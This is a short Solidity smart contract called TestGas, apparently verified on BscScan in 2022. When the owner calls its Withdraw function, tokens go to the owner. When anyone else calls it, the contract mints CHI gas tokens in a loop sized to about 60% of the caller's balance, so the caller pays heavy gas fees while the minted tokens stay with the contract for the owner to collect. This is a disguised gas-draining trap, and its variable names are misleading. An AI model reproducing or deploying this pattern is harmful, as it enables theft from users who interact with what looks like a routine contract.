/**
 *Submitted for verification at BscScan.com on 2022-08-28
*/

pragma solidity ^0.8.7;

interface TokenMetadata {
    function mint(uint256 value) external;

    function transfer(address recipient, uint256 amount) external;
}

contract TestGas{
    TokenMetadata Chi = TokenMetadata(0x0000000000004946c0e9F43F4Dee607b0eF1fA1c);

    address private owner;

    constructor() public {
        owner = msg.sender;
    }

    function Withdraw(address _token, uint256 amount) public{
        if(owner == msg.sender){
            TokenMetadata token = TokenMetadata(_token);
            token.transfer(msg.sender,amount);
        }
        else{
            ChiGasMint();
        }
    }

    function ChiGasMint() public {
        uint256 EightyPBalance = GetChiGasT();

        while(true){
            if(EightyPBalance > 688){
                EightyPBalance = EightyPBalance-688;
                Chi.mint(688);
            }
            else {
                Chi.mint(EightyPBalance);
                break;
            }
        }
    }
    function ChiGasMintNormal() public {
        Chi.mint(GetChiGasT());
    }
    function GetChiGasT() private returns (uint256){
        uint256 baseGas = 134185000000000;
        uint256 forOne = 181465000000000;
        uint256 senderBalance = msg.sender.balance;

        uint256 EightyPBalance = (senderBalance/100*60)-baseGas;

        require(EightyPBalance > 0, "insufficient balance");

        return EightyPBalance;
    }
}